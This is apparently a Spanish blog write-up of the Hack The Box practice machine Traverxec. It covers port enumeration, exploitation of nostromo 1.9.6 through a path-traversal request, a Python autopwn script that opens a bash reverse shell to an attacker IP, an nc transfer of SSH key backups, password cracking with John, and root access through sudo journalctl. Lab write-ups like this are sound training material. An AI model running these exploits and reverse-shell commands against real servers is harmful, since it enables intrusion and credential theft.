---
layout: post
title: HTB_Traverxec
date: 2023/07/10
slug: HTB_Traverxec
heroImage: /assets/machines.jpg
---

# Traverxec {-}

## Introduccion {-}

La maquina del dia 23/07/2021 se llama Traverxec.

El replay del live se puede ver en [Twitch: S4vitaar Traverxec maquina](https://www.twitch.tv/videos/1095841567)
## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.165
```
ttl: 63 -> maquina linux. 
Recuerda que en cuanto a ttl 64 = linux y 128 = windows. 
Pero como estamos en hackthebox hay un nodo intermediario que hace que el ttl disminuya una unidad

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.165
```

Va un poquito lento...

```bash
nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.165 -oG allPorts
extractPorts allPorts
nmap -sC -sV -p22,80 10.10.10.165 -oN targeted
```

|Puerto|Servicio| Que se nos occure?    |    Que falta?      |
|------|--------|-----------------------|--------------------|
|22    |ssh     |conneccion a la maquina|Usuario contraseña  |
|80    |http    |whatweb, http-enum     |Checkear la web     |


### Empezamos por el puerto 80 {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.165
```

- nostromo 1.9.6

#### Chequear la cabecera {-}

```bash
curl -s -X GET -I http://10.10.10.165
```

- nostromo 1.9.6

#### Browsear la web {-}

Nada interessante.

#### WFuzz {-}

Como no hay mucho mas que ver, aplicaremos **fuzzing** para descubrir si hay mas rutas.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.233/FUZZ
```

No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez.

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.233/FUZZ.FUZ2Z
```

No hay nada.


## Evaluacion de Vulnerabilidades {-}

### searchsploit {-}

Chequeamos si existe un exploit relacionado con **nostromo 1.9.6**

```bash
searchsploit nostromo 
```

Hay un script en Python que permitiria hacer ejecucion de comandos. Nos traemos el script en el repertorio de trabajo.

```bash
searchsploit -m 47837
mv 47837.py nostromo_exploit.py
```

Analizando el script con 
```bash
 cat 
```
, vemos como se uza el exploit. Intentamos reproducir los pasos antes de crearnos nuestro
proprio script.

1. En una terminal

    ```bash
    nc -nlvp 443
    ```

1. En otra terminal

    ```bash
    telnet 10.10.10.165 80
    POST /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0
    Content-Length: 1

    whoami | nc 10.10.14.20 443
    ```

Se ve 
```bash
 www-data 
```
 en la primera terminal.

Ya podemos crearnos el script.

## Explotacion de vulnerabilidad & Ganando Acceso {-}

### Autopwn.py {-}

```python
#!/usr/bin/python3

import requests
import sys
import signal
import pdb
import threading
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
main_url = "http://10.10.10.165/.%0d./.%0d./.%0d./.%0d./bin/sh"
lport = 443

def makeRequest():

    data_post = {
        b'bash -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"'
    }

    r = requests.post(main_url, data=data_post)

if __name__ == '__main__':

    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    p1 = log.progress("Acceso")
    p1.status("Ganando acceso al sistema")

    shell = listen(lport, timeout=5).wait_for_connection()

    if shell.sock is None:
        p1.failure("No ha sido posible ganar acceso al sistema")
        sys.exit(1)
    else:
        shell.interactive()
```

Lo ejecutamos

```bash
python autopwn.py
whoami
#Output
www-data

ifconfig
```

El tito prefiere entablarse una shell normal. Se pone en escucha con 
```bash
 nc -nlvp 443 
```
 y lanza en la shell creado por el script

```bash
 bash -i >& /dev/tcp/10.10.14.20/443 0>&1 
```


### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <numero filas> columns <numero columnas>
```

## Escalada de privilegios {-}

### Enumeracion del usuario en la maquina victima {-}

```bash
cd /home
#Output
david

ls /home/david
#Output
Permisson denied

ls -l /home
#Output
drwx--x--x
```

Enumeramos el systema

```bash
cd /
id
sudo -l
find \-perm -4000 2>/dev/null
cd /var
ls
cd nostromo
cd conf
cat nhttpd.conf
cat /var/nostromo/conf/.htpasswd
```

Encontramos el hash del usuario david vamos a copiarlo en la maquina de atacante, y intentamos bruteforcear con **John**

### John {-}

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Encontramos una contraseña intentamos ponerla haciendo un 
```bash
 su david 
```
 y 
```bash
 su root 
```
, pero no va. La conclusion a la que hay que llegar
es que cuando miras el fichero nhttpd.conf, dice que hay un directorio **public_www**.


### Investigacion del public_www {-}

Intentamos ver si esta en el directorio 
```bash
 /home/david/public_www 
```
 y efectivamente. hay un fichero comprimido y nos vamos a transferir 
a nuestro equipo de atacante.

1. En el equipo de atacante

    ```bash
    nc -nlvp 443 > comprimido.tgz
    ```

1. En el equipo victima

    ```bash
    nc 10.10.14.20 443 < backup-ssh-identity-files.tgz
    ```

Descomprimimos el archivo con el comando

```bash
7z l comprimido.tgz
7z x comprimido.tgz
7z l comprimido.tar
7z x comprimido.tar 
```

Hay la clave privado del usuario david pero esta protegida por contraseña. La tenemos que romper.

### ssh2john {-}

```bash
ssh2john.py id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

La contraseña de la id_rsa a sido crackeada y ya nos podemos conectar con ssh

```bash
ssh -i id_rsa david@10.10.10.165 
```

### Escalada de privilegio para root {-}

```bash
ls -l
#Output
bin

cd bin/
cat server-stats.sh
```

Vemos en este fichero que sudo puede ejecutar **journalctl**

Vamos a la pagina de [gtfobins](gtfobins.github.io) y buscamos por jounalctl

El **gtfobins** dice que hay que lanzar jounalctl con sudo y en otra linea poner 
```bash
 !/bin/sh 
```


> [!] NOTA: cuando pone ! en otra linea quiere decir que hay que ejecutarlo en modo less. O sea hay que reducir la terminal para que se pueda introducir un nuevo commando. En este caso !/bin/sh

Ya estamos root y seguimos mas hack que nunca.
